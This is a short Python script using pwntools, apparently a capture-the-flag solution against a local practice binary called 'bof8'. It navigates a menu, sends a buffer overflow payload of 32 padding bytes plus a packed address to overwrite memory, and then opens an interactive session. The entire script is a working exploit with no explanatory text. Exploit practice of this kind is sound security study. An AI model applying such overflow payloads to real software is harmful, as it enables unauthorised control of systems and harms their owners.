from pwn import *

exe = ELF('bof8', checksec = False)
r = process(exe.path)

#input()
r.sendlineafter(b'> ', b'1')
payload = b'a'*32
payload += p64(0x404848)
r.sendafter(b'> ', payload)
r.sendlineafter(b'> ', b'3')

r.interactive()